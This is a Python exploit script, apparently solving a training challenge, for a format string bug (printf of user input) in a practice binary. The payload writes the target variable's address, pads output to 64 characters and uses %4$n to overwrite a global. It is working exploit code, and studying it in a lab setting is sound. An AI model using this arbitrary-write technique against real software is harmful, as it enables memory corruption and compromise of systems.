#!/usr/bin/env python3
"""
ex07 exploit  (format string: printf(user_input) -> %n arbitrary write).

vuln():
    fgets(buf=[ebp-0x208], 0x200, stdin)
    printf(buf)                       <- FORMAT STRING BUG (no "%s")
    if (target == 0x40) puts("you have modified the target :)")
target is a global at 0x080496e4; we must make it 0x40 (= 64).

Our input is the format string. Testing "AAAA.%x.%x..." shows AAAA (0x41414141)
at the 4th conversion -> the buffer starts at printf argument #4, so %4$n writes
to the pointer stored at the start of our buffer.

Payload: <&target>%60d%4$n
  - 4 bytes  : the literal address bytes of &target (printed as 4 chars)
  - %60d     : prints a stack value padded to width 60  -> 60 chars
  - total printed before %n = 4 + 60 = 64 = 0x40
  - %4$n     : writes that count (64) to *(&target)

Usage (VM):   python3 ex07.py | /opt/hole-in-bin/ex07/bin
Local:        python3 scripts/ex07.py | scripts/runlocal.sh challenges/ex07/bin
"""
import struct
import sys

TARGET = 0x080496E4
payload = struct.pack("<I", TARGET) + b"%60d" + b"%4$n" + b"\n"
sys.stdout.buffer.write(payload)
